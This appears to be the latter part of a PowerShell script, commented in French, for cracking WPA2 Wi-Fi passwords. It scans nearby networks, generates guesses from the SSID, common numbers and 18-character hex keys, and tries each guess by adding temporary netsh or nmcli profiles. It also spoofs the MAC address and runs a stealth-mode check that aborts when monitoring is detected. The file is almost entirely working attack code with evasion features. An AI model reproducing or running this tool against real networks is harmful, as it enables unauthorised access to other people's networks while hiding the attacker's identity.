    # MOTS DE PASSE BASÉS SUR LE SSID
    if ($SSID) {
        $words = $SSID -split '\s+'
        $combined = ($words -join "").ToLower()
        
        $basePatterns = @($combined, $words[0], $words[-1]) | Where-Object { $_ -and $_.Length -ge 3 }
        
        foreach ($base in $basePatterns) {
            foreach ($num in @('123', '1234', '12345', '123456', '000', '111', '999')) {
                $pattern = "$base$num"
                if ($pattern.Length -ge 8 -and $pattern.Length -le 63) {
                    if (-not $WrongPasswords -or -not $WrongPasswords.Contains($pattern)) {
                        [void]$passwords.Add($pattern)
                    }
                }
            }
            
            foreach ($year in 2020..2024) {
                $pattern = "$base$year"
                if (-not $WrongPasswords -or -not $WrongPasswords.Contains($pattern)) {
                    [void]$passwords.Add($pattern)
                }
            }
        }
    }
    
    # MOTS DE PASSE HEXADÉCIAUX 18 CARACTÈRES
    Write-Log "Generating $HexCount hexadecimal passwords (18 chars)..." "INFO" $LogFile $DebugFile
    
    $generator = [HexPasswordGenerator]::new($script:CONFIG.HexPasswordLength)
    $hexBatch = $generator.GenerateBatch($HexCount)
    
    foreach ($hex in $hexBatch) {
        if (-not $WrongPasswords -or -not $WrongPasswords.Contains($hex)) {
            [void]$passwords.Add($hex)
        }
    }
    
    $hexPatterns = @(
        "000000000000000000", "111111111111111111", "888888888888888888",
        "123456789012345678", "876543210987654321",
        "ABCDEF123456789012", "0123456789ABCDEF01",
        "FEDCBA0987654321EF", "AABBCCDDEEFF001122"
    )
    
    foreach ($pattern in $hexPatterns) {
        if (-not $WrongPasswords -or -not $WrongPasswords.Contains($pattern)) {
            [void]$passwords.Add($pattern)
        }
    }
    
    # Filtrer les doublons
    $unique = [System.Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)
    $finalList = [System.Collections.Generic.List[string]]::new()
    
    foreach ($pass in $passwords) {
        if ($unique.Add($pass)) {
            [void]$finalList.Add($pass)
        }
    }
    
    Write-Log "Total unique passwords generated: $($finalList.Count)" "INFO" $LogFile $DebugFile
    
    return $finalList
}

function Test-WifiConnection {
    param(
        [string]$SSID,
        [string]$Password,
        [string]$Security,
        [string]$Interface,
        [string]$LogFile,
        [string]$DebugFile
    )
    
    try {
        if ($script:CONFIG.IsWindows) {
            $profileName = "Temp_$(Get-Random)"
            $profileXml = @"
<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>$profileName</name>
    <SSIDConfig>
        <SSID>
            <name>$([Security.SecurityElement]::Escape($SSID))</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>manual</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>$([Security.SecurityElement]::Escape($Password))</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>
"@
            
            $tempFile = [System.IO.Path]::GetTempFileName()
            $profileXml | Out-File -FilePath $tempFile -Encoding UTF8
            
            netsh wlan add profile filename="$tempFile" interface="$Interface" | Out-Null
            netsh wlan connect name="$profileName" interface="$Interface" | Out-Null
            
            Start-Sleep -Milliseconds 2000
            
            $interfaceInfo = netsh wlan show interfaces interface="$Interface" | Out-String
            $connected = ($interfaceInfo -match "State\s+:\s+connected" -and $interfaceInfo -match "SSID\s+:\s+$([regex]::Escape($SSID))")
            
            netsh wlan delete profile name="$profileName" | Out-Null
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
            
            return $connected
            
        } else {
            $connectionName = "temp_$(Get-Random)"
            
            $result = sudo nmcli connection add type wifi con-name $connectionName ifname $Interface ssid $SSID wifi-sec.key-mgmt wpa-psk wifi-sec.psk $Password 2>&1
            sudo nmcli connection up $connectionName 2>&1 | Out-Null
            Start-Sleep -Milliseconds 2000
            
            $active = sudo nmcli connection show --active | Select-String $connectionName
            sudo nmcli connection delete $connectionName 2>&1 | Out-Null
            
            return ($active -ne $null)
        }
    }
    catch {
        Write-Log "Connection test error: $_" "ERROR" $LogFile $DebugFile
        return $false
    }
}

# ============================================
# FONCTION PRINCIPALE
# ============================================

function Start-WifiCrack {
    try {
        # Initialisation
        $defaultLogs = Get-LogPaths
        
        if (-not (Test-AdminRights)) {
            Write-Host "Administrator/root rights required!" -ForegroundColor Red
            return
        }
        
        $envInfo = Get-EnvironmentInfo
        Write-Log "Environment: $($envInfo.OS) | Admin: $($envInfo.IsAdmin)" "INFO" $defaultLogs.LogFile $defaultLogs.DebugFile
        
        # Vérification sécurité
        if (-not $SkipSecurityCheck) {
            Write-Host "`nPerforming security checks..." -ForegroundColor Yellow
            $securityMgr = [SecurityManager]::new($defaultLogs.LogFile, $defaultLogs.DebugFile, $script:CONFIG.StealthMode)
            $securityCheck = $securityMgr.CheckEnvironment()
            
            if ($securityCheck.CriticalIssues.Count -gt 0) {
                Write-Host "`nCRITICAL SECURITY ISSUES:" -ForegroundColor Red
                foreach ($issue in $securityCheck.CriticalIssues) {
                    Write-Host "  - $issue" -ForegroundColor Red
                }
                if ($script:CONFIG.StealthMode) {
                    Write-Host "`nOperation aborted." -ForegroundColor Red
                    return
                }
            }
            
            if ($securityCheck.Warnings.Count -gt 0) {
                Write-Host "`nWarnings:" -ForegroundColor Yellow
                foreach ($warning in $securityCheck.Warnings) {
                    Write-Host "  - $warning" -ForegroundColor Yellow
                }
                $continue = Read-Host "`nContinue? (Y/N)"
                if ($continue -ne "Y" -and $continue -ne "y") { return }
            }
        }
        
        Clear-Host
        Write-Host "WiFi Security Testing Tool v5.0" -ForegroundColor Cyan
        Write-Host "OS: $($envInfo.OS) | Mode: $Mode | Region: $($script:CONFIG.RegionTarget)" -ForegroundColor Gray
        Write-Host "===================================================" -ForegroundColor Cyan
        
        # Sélection adaptateur
        $adapter = Select-NetworkAdapter
        if (-not $adapter) { return }
        
        $script:CONFIG.Interface = $adapter.Name
        $script:CONFIG.InterfaceGUID = if ($adapter.GUID) { $adapter.GUID } else { $adapter.Name }
        
        Write-Host "`nSelected: $($adapter.Name)" -ForegroundColor Green
        
        # MAC Spoofing
        Save-OriginalMac -Interface $adapter.Name
        
        if (-not $DisableMacSpoof) {
            Write-Host "`nChanging MAC address..." -ForegroundColor Yellow
            if (-not (Set-MacAddress -Interface $adapter.Name)) {
                $cont = Read-Host "Continue with original MAC? (Y/N)"
                if ($cont -ne "Y" -and $cont -ne "y") { return }
            }
        }
        
        # Scan réseaux
        Write-Host "`nScanning for networks..." -ForegroundColor Yellow
        $networks = Get-WifiNetworks -LogFile $defaultLogs.LogFile -DebugFile $defaultLogs.DebugFile
        
        if (-not $networks -or $networks.Count -eq 0) {
            Write-Host "No networks found!" -ForegroundColor Red
            return
        }
        
        Write-Host "`nAvailable Networks:" -ForegroundColor Cyan
        for ($i = 0; $i -lt $networks.Count; $i++) {
            Write-Host "[$i] $($networks[$i].SSID) (Signal: $($networks[$i].Signal)%)" -ForegroundColor Green
        }
        
        # Sélection réseau
        do {
            $sel = Read-Host "`nSelect network (0-$($networks.Count - 1))"
        } while ($sel -notmatch '^\d+$' -or [int]$sel -lt 0 -or [int]$sel -ge $networks.Count)
        
        $target = $networks[[int]$sel]
        Write-Host "`nTarget: $($target.SSID)" -ForegroundColor Cyan
        
        # Initialisation
        $paths = Get-LogPaths -SSID $target.SSID
        
        # Génération mots de passe
        Write-Host "`nGenerating password list..." -ForegroundColor Yellow
        $wrongPasswords = [System.Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)
        
        if (Test-Path $paths.WrongPasswordsFile) {
            Get-Content $paths.WrongPasswordsFile | ForEach-Object { [void]$wrongPasswords.Add($_) }
        }
        
        $passwordList = Generate-PasswordList -SSID $target.SSID -LogFile $paths.LogFile -DebugFile $paths.DebugFile -WrongPasswords $wrongPasswords -HexCount $HexPasswordCount
        
        if ($passwordList.Count -eq 0) {
            Write-Host "No passwords generated!" -ForegroundColor Red
            return
        }
        
        Write-Host "Total passwords to test: $($passwordList.Count)" -ForegroundColor Cyan
        Write-Host "Press 'Q' to stop`n" -ForegroundColor Yellow
        
        # Test
        $connectionMgr = [ConnectionStateManager]::new($script:CONFIG.Interface, $script:CONFIG.InterfaceGUID, $paths.LogFile, $paths.DebugFile)
        $progress = [ProgressTracker]::new($passwordList.Count, $paths.LogFile, $paths.DebugFile)
        $connectionMgr.StartTimer()
        
        $hexTested = 0
        $regularTested = 0
        
        foreach ($password in $passwordList) {
            if ([Console]::KeyAvailable) {
                $key = [Console]::ReadKey($true)
                if ($key.Key -eq 'Q') { break }
            }
            
            $progress.UpdateProgress($password)
            
            # Compteur
            if ($password -match '^[0-9A-F]{18}$') { 
                $hexTested++ 
            } else { 
                $regularTested++ 
            }
            
            # Vérification sécurité périodique
            $timeSinceLastCheck = (Get-Date) - $script:CONFIG.LastSecurityCheck
            if ($timeSinceLastCheck.TotalSeconds -gt $script:CONFIG.SecurityCheckInterval) {
                if (-not $SkipSecurityCheck) {
                    $quickCheck = [SecurityManager]::new($paths.LogFile, $paths.DebugFile, $script:CONFIG.StealthMode)
                    $check = $quickCheck.CheckEnvironment()
                    if ($check.CriticalIssues.Count -gt 0) {
                        Write-Host "`nSECURITY ALERT!" -ForegroundColor Red
                        break
                    }
                }
                $script:CONFIG.LastSecurityCheck = Get-Date
            }
            
            # Test connexion
            $success = Test-WifiConnection -SSID $target.SSID -Password $password -Security $target.Security -Interface $script:CONFIG.Interface -LogFile $paths.LogFile -DebugFile $paths.DebugFile
            
            if ($success) {
                $elapsed = $connectionMgr.GetElapsedTime()
                $stats = $progress.GetStatistics()
                
                Write-Host "`n`nPASSWORD FOUND!" -ForegroundColor Green
                Write-Host "SSID: $($target.SSID)" -ForegroundColor Green
                Write-Host "Password: $password" -ForegroundColor Green
                Write-Host "Time: $($elapsed.ToString('mm\:ss'))" -ForegroundColor Green
                
                if ($password -match '^[0-9A-F]{18}$') {
                    Write-Host "Type: 18-char HEXADECIMAL" -ForegroundColor Magenta
                }
                
                Write-Log "SUCCESS: Password found" "SUCCESS" $paths.LogFile $paths.DebugFile
                
                $result = @"
SSID: $($target.SSID)
Password: $password
Time: $($elapsed.ToString('mm\:ss'))
Tested: $($stats.TestedPasswords)
Date: $(Get-Date)
"@
                $result | Out-File -FilePath $paths.SuccessFile -Encoding UTF8
                
                # Restaurer MAC
                if (-not $DisableMacSpoof) {
                    Set-MacAddress -Interface $script:CONFIG.Interface -RestoreOriginal
                }
                
                return
            }
            
            Add-Content -Path $paths.WrongPasswordsFile -Value $password
        }
        
        # Fin
        $progress.Complete()
        $elapsed = $connectionMgr.GetElapsedTime()
        
        Write-Host "`nPassword not found." -ForegroundColor Red
        Write-Host "Time: $($elapsed.ToString('mm\:ss'))" -ForegroundColor Yellow
        Write-Host "Tested: Regular=$regularTested, HEX-18=$hexTested" -ForegroundColor Gray
        
        # Restaurer MAC
        if (-not $DisableMacSpoof) {
            Write-Host "`nRestoring original MAC..." -ForegroundColor Yellow
            Set-MacAddress -Interface $script:CONFIG.Interface -RestoreOriginal
        }
        
    }
    catch {
        Write-Host "`nCritical error: $_" -ForegroundColor Red
        Write-Log "Critical error: $_" "ERROR"
        
        if (-not $DisableMacSpoof -and $script:CONFIG.Interface) {
            Set-MacAddress -Interface $script:CONFIG.Interface -RestoreOriginal
        }
    }
    finally {
        # S'assurer que la MAC est restaurée et l'interface réactivée en cas d'arrêt brutal
        if (-not $DisableMacSpoof -and $script:CONFIG.Interface -and $script:CONFIG.SpoofedMac) {
            Write-Host "`nArrêt détecté. Restauration de la MAC d'origine..." -ForegroundColor Yellow
            Set-MacAddress -Interface $script:CONFIG.Interface -RestoreOriginal
        }
        
        Write-Host "`nPress any key to exit..." -ForegroundColor Cyan
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    }
}

# ============================================
# POINT D'ENTRÉE
# ============================================

try {
    $proc = Get-Process -Id $PID
    $proc.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::High
}
catch { }

Start-WifiCrack